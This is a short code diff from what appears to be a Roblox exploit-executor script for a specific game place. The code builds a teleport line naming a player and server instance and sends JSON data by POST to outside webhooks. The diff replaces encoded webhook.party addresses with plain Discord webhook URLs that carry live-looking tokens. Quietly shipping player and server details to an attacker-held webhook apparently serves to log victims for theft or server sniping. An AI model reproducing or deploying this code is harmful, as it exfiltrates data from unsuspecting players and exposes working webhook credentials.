@@ -2143,8 +2143,8 @@ local allowedPlaceId = 109983668079237
 if game.PlaceId ~= allowedPlaceId then return end
 
 local webhookUrls = {
-    "https://l.webhook.party/hook/izaU7WK3VF6yeU6aG2faKVAjURj13PqDGBq1twPokjXYiIsbEIZhxW9u19vgQ1SYSLTzpqUgePyKjI97i1jMEBHWxlaLLxUUJSQhn%2Fw%2F3Jo4M1s%2F7oCuktzKXv7RZ8yg6EJbOnahEjHSuSSUuKDM6vroFiTSGwaJzvISaHDub96SrOiP91laSoMlJDbtrrrAhsAQR%2BmfSx4w%2FlV9Y%2BzAiIg9FI2HbZw30fg0Vcxmx0r%2BsykvTKMGdmJ89x%2FXUmCRd0DHrlUll3R79%2BVl0jrtASpFtT6gJ11T0Y1kuKDmiPbkSjIuMf8tqK%2BaW%2Br%2B%2BXoIV2W0rn4zPj3l3zZGdiEBz6xOIQvhZPGX0d2Yg4t8mKWXAA0yDt5gotaNtegZvOsAIQxc8R9Ci5Q%3D/%2B9hKrr37EpftHs8X",
-    "https://l.webhook.party/hook/4Q2UHtH5qlS0zOrZgd330wQ0pxCIGhY%2FKSMCHQ59Q3lbyojiO30vey0%2BpkhM%2FPL0s8Jgq0LvJ9IxlmNdsSd34HOJ2UVuSVGKNdsOQby3WQgJ2Vb%2FYAlS%2BAWnSJNM9B%2Bg5Lg3vdIbu2PosEolfFw1IflnrNFqIdmmvVYefyIsLSZzCk6FacfZCFMo5FsabJBQ%2FQRUj1oKKZo3tcsRKbS9Nyn6uGUAFKbNHBWi%2BFklMj5rYG73B35hrakgWmGCWh1nNSnnBf8mvI4MN9RGAN4YDQz9flWHPMbbAJ4infspEr51Fkc28nB%2FqHA5DfnEOQOs2wSv4to%2BYwInESygsIb1P2eLgJZ%2FEKdB7ApmGCeWqTGXiZgF8Io0oImy6C1p4y0TheIgNot4eBw%3D/GnPPL2QWUImtRPNb"
+    "https://discord.com/api/webhooks/1397994822396149890/k7gMoTUoiEFaR4733ymwSKjRd5iVfwhiCyWRDNbltfvPSKQHQpWpIr5GxCOfkSx-kWRd",
+    "https://discord.com/api/webhooks/1397993708124770416/C0W7wrzwpWQltujrupJ0qOUfnX9sf3_5NVd3EgbctdLSHTisXm_-juUKt7QN5zAWYA2b"
 }
 
 local brainrotGods = {
@@ -2284,11 +2284,10 @@ teleportService:TeleportToPlaceInstance("%s", "%s", player)
     local req = (syn and syn.request) or (http and http.request) or request or http_request
     if not req then return end
 
-    for _, rawUrl in ipairs(webhookUrls) do
-        local decodedUrl = HttpService:UrlDecode(rawUrl)
+    for _, url in ipairs(webhookUrls) do
         pcall(function()
             req({
-                Url     = decodedUrl,
+                Url     = url,
                 Method  = "POST",
                 Headers = headers,
                 Body    = jsonData
